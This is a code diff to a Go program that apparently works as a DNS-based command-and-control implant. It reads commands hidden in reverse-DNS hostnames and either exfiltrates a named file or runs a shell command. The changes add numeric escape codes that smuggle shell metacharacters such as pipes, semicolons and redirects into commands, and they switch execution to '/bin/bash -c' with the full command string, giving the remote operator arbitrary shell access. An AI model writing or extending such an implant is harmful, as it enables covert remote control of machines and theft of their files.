@@ -22,31 +22,24 @@ func resolveCommand(host []string, bl *int) {
 	if strings.Contains(host[0], trigger_mappings["cmd"]) {
 		// Determine if the client is looking for a file name or a file at a specific path
 
-		fmt.Printf("Received command: %v\n", host[0])
-
-		// Sections are:
-		//		[0]		cmd
-		//		[1]		action-type
-		// 		[2]		filename-or-filepath
-		//		[3]		extension
 		sections := strings.Split(host[0], ".")
 
 		// Action type (exfil, ls, etc.)
-		action_type := strings.Split(sections[1], "-")[0]
+		action_type := strings.Split(sections[0], "-")[1]
 
 		switch action_type {
 
 		// Download command has been received
 		case trigger_mappings["exf"]:
 			// Destination type (filename or filepath; "single" or "path")
-			dest_type := strings.Split(sections[1], "-")[1]
+			dest_type := strings.Split(sections[0], "-")[2]
 
-			// var filepath string = ""
-			filepath := fmt.Sprintf("%v.%v", sections[2], sections[3])
-			if trigger_mappings[dest_type] == "path" {
-				filepath_sections := strings.Split(sections[2], "-")
-				filepath = strings.Join(filepath_sections, "/")
-				filepath = fmt.Sprintf("/%v.%v", filepath, sections[3])
+			args := sections[1:]
+			filepath := strings.Join(args, ".")
+			filepath = strings.Replace(filepath, "-", "/", -1)
+			filepath = filepath[:len(filepath)-1]
+			if dest_type == "path" {
+				filepath = fmt.Sprintf("/%v", filepath)
 			}
 
 			// Perform the usual exfil operation as you would otherwise
@@ -56,14 +49,29 @@ func resolveCommand(host []string, bl *int) {
 
 		// List directory command has been received
 		case trigger_mappings["bash"]:
+			replacement_mappings := map[string]string{"79": ".", "78": "|", "77": ";", "76": "'", "75": ">"}
+
 			// https://www.sohamkamani.com/golang/exec-shell-command/
 			var mode string = "c2"
-			bash_command_sections := strings.Split(sections[2], "-")
-			bash_command := strings.Join(bash_command_sections, " ")
-			bash_command = strings.Replace(bash_command, "_", "/", -1)
-			bash_command_sections = strings.Split(bash_command, " ")
+			command := strings.Split(sections[0], "-")[2]
+			args := sections[1:]
+			bash_command := strings.Join(args, "")
 
-			cmd := exec.Command(bash_command_sections[0], bash_command_sections[1])
+			if len(args) > 0 {
+				indiv_args := strings.Split(bash_command, "-")
+				bash_command = strings.Join(indiv_args, " ")
+				bash_command = strings.Replace(bash_command, "_", "/", -1)
+
+				for k, v := range replacement_mappings {
+					if strings.Contains(bash_command, k) {
+						bash_command = strings.Replace(bash_command, k, v, -1)
+					}
+				}
+
+				bash_command = fmt.Sprintf("%v %v", command, bash_command)
+			}
+
+			cmd := exec.Command("/bin/bash", "-c", bash_command)
 			out, err := cmd.Output()
 			if err != nil {
 				fmt.Printf("Error: %v\n", err)
@@ -89,9 +97,6 @@ func resolveAddr(address string, bl *int) {
 		},
 	}
 	host, _ := r.LookupAddr(context.Background(), address)
-	// if err != nil {
-	// 	fmt.Println(err)
-	// }
 	if len(host) > 0 {
 		resolveCommand(host, bl)
 	}
